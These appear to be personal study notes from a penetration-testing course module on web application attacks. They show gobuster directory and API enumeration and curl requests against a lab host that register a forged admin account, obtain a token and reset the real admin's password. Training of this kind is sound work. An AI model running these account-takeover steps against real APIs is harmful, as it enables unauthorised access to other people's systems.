# Module 8 : Introduction to Web Application Attacks

---

## 8.3.3 Enumerating and Abusing APIs


### Directory Brute Force with Gobuster

Happens after you find out the IP is running http/https

```bash

#Reference
tldr gobuster

#brute force a web directory with gobuster
gobuster dir -u <ip.addr> -w /usr/share/dirb/wordlists/common.txt -t 80

#If faced with 301 error try: (forces redirect, if destination exists)
gobuster dir -u <ip.addr> -w /usr/share/wordlists/dirb/common.txt -r

#If faced with another error try: (ignores 301 requests)
gobuster dir -u <ip.addr> -w /usr/share/wordlists/dirb/common.txt -b 301

#If no results, use a bigger wordlist:
gobuster dir -u http://192.168.247.16:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 80    
```

### Discovering APIs

```bash
#Inside pattern, include possible versions
{GOBUSTER}/v1
{GOBUSTER}/V2

#Run the command to discover possible APIs, PORT is important
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

#lists out information like username, password (typically forbidden to enter Status: 405)
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

```

### Sending API requests via CURL

```bash
#After discovering the API and version, assuming users is the API
#For this context, it will list out usernames and other information in json format
curl -i http://192.168.50.16:5002/users/v1

#Sends a request to an API by converting a GET request into a POST
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

#Forging an admin account
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

#Receiving the Authentication token
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}

#Changing Original Admin password
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

#Method 2
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

```

---

Also, use CTRL+U to view source code


## 8.2.4 Burpsuite

burpsuite cheatsheet.

![Here is the results of my first burpsuite!](image.png)


